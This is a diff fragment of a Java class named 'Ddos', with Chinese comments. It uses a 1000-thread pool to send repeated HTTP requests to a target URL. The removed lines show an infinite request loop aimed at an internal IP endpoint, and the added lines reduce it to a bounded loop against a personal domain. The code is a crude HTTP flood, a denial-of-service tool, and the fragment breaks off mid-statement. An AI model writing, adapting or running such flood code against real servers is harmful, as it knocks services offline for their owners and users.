@@ -14,20 +14,26 @@ import java.util.concurrent.Executors;
  */
 public class Ddos {
 
+    public static void main(String[] args) {
+        Ddos ddos = new Ddos();
+        ddos.testDdos();
+    }
+
     public void testDdos() {
         //利用线程池创建1000个线程
         ExecutorService es = Executors.newFixedThreadPool(1000);
         MyThread mythread = new MyThread();
         Thread thread = new Thread(mythread);
-        for (int i = 0; i < 10000; i++) {
+        for (int i = 0; i < 10; i++) {
             es.execute(thread);
         }
     }
+
     static class MyThread implements Runnable {
         public void run() {
-            while (true) {
+            for (int i = 0; i < 10; i++) {
                 try {
-                    URL url = new URL("http://30.43.48.249:8888/export/pdf");
+                    URL url = new URL("http://yijin840.top/");
                     URLConnection conn = url.openConnection();
                     System.out.println("发包成功！");
                     BufferedInputStream bis = new BufferedInputStream(
